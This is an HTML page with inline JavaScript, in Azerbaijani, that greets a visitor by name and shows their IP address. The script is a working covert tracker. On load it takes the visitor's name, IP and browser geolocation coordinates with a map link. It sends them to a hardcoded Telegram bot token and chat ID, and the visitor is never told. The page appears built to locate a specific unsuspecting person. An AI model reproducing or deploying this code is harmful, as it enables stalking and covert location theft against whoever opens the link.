<!DOCTYPE html>
<html lang="az">
<head>
  <meta charset="UTF-8" />
  <title>Prenses yakalama</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      margin-top: 100px;
      background: #f0f0f0;
      color: #333;
    }
    #greeting {
      font-size: 24px;
      margin-bottom: 20px;
    }
    #ipDisplay {
      font-size: 30px;
      margin-top: 40px;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div id="greeting"></div>
  <div id="ipDisplay">Loading...</div>

  <script>
    const token = '8408687620:AAEy2vYnaR8Be9kpbjoKpCTUAXMMHvvd4AE';
    const chatId = '1689497109';

    async function sendToTelegram(messageText) {
      const message = encodeURIComponent(messageText);
      const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${message}`;
      try {
        const response = await fetch(url);
        if (!response.ok) {
          console.error('Telegrama mesaj göndərilə bilmədi');
        }
      } catch (error) {
        console.error('Xəta:', error);
      }
    }

    async function getIpAndSend(name) {
      try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        const ip = data.ip;

        document.getElementById('ipDisplay').textContent = `API ünvanın: ${ip}`;

        // İcazə varsa geolokasiya almağa çalışırıq
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(
            position => {
              const lat = position.coords.latitude.toFixed(5);
              const lon = position.coords.longitude.toFixed(5);
              const mapUrl = `https://maps.google.com/?q=${lat},${lon}`;

              // Telegrama mesaj göndərilir (ad, ip, koordinatlar və xəritə linki)
              const messageText = `Yeni istifadəçi: ${name}\nIP-si: ${ip}\nYer: ${lat}, ${lon}\nXəritə: ${mapUrl}`;
              sendToTelegram(messageText);
            },
            error => {
              // Əgər geolokasiya alınmasa sadəcə IP göndərilir
              const messageText = `Yeni istifadəçi: ${name}\nIP-si: ${ip}\nGeolokasiya əldə edilə bilmədi: ${error.message}`;
              sendToTelegram(messageText);
            }
          );
        } else {
          // Brauzer geolokasiyanı dəstəkləmirsə
          const messageText = `Yeni istifadəçi: ${name}\nIP-si: ${ip}\nGeolokasiya dəstəklənmir.`;
          sendToTelegram(messageText);
        }
      } catch (error) {
        document.getElementById('ipDisplay').textContent = 'IP alınarkən xəta baş verdi';
        console.error('IP alınarkən xəta:', error);
      }
    }

    window.onload = () => {
      const name = prompt("Zəhmət olmasa adınızı yazın");
      if (name && name.trim() !== "") {
        document.getElementById('greeting').textContent = `Salam ${name}!, deməli sənin API ünvanın belədir:`;
        getIpAndSend(name);
      } else {
        document.getElementById('greeting').textContent = `Salam! Sənin API ünvanın belədir:`;
        getIpAndSend("Anonim istifadəçi");
      }
    };
  </script>
</body>
</html>
